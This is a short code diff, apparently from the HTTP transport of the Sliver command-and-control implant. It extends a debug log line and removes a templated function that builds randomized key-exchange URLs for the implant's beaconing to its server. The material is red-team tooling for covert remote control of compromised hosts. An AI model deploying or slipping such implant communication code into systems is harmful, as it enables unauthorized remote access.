@@ -161,7 +161,7 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	s.OTPQueryArgument(uri, otpCode)
 	req := s.newHTTPRequest(http.MethodPost, uri, reqBody)
 	// {{if .Config.Debug}}
-	log.Printf("[http] POST -> %s", uri)
+	log.Printf("[http] POST -> %s (%d bytes)", uri, len(sessionInit))
 	// {{end}}
 
 	resp, err := s.Client.Do(req)
@@ -293,22 +293,6 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 		segments = append([]string{s.PathPrefix}, segments...)
 	}
 	return strings.Join(segments, "/")
-}
-
-func (s *SliverHTTPClient) keyExchangeURL() *url.URL {
-	curl, _ := url.Parse(s.Origin)
-	segments := []string{
-		// {{range .HTTPC2ImplantConfig.KeyExchangePaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2ImplantConfig.KeyExchangeFiles}}
-		"{{.}}",
-		// {{end}}
-	}
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.KeyExchangeFileExt}}"))
-	return curl
 }
 
 func (s *SliverHTTPClient) pollURL() *url.URL {
